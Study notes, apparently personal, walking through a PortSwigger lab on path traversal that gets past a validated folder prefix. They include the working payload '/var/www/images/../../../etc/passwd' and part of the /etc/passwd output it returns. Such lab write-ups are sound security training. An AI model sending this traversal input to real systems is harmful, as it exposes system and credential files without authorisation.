# #PortSwigger 


![[Pasted image 20251214144648.png]]


## Lab Description

>This lab contains a path traversal vulnerability in the display of product images. The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
>
>**Objective:** Retrieve the contents of the `/etc/passwd` file.

---
---

### Step 1: Capture the Image Request

1. In Burp's browser, access the lab
2. Browse to a product page
3. Find an image request in Burp Proxy

**Example request:**
```
GET /image?filename=product1.jpg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


---

### Step 2: Modify the Filename

**Original:**
```
GET /image?filename=product1.jpg HTTP/1.1
```

**Modified (with validated prefix + traversal):**
```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

Ex:
```
https://0a2400c503e0d8c080d9ad4800e1009b.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```

![[Pasted image 20251214144809.png]]


---

### Step 4: Send the Request

1. Click **Send** in Repeater
2. Observe the response

**Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


---

### Step 5: Lab Solved

![[Pasted image 20251214144835.png]]


---
---

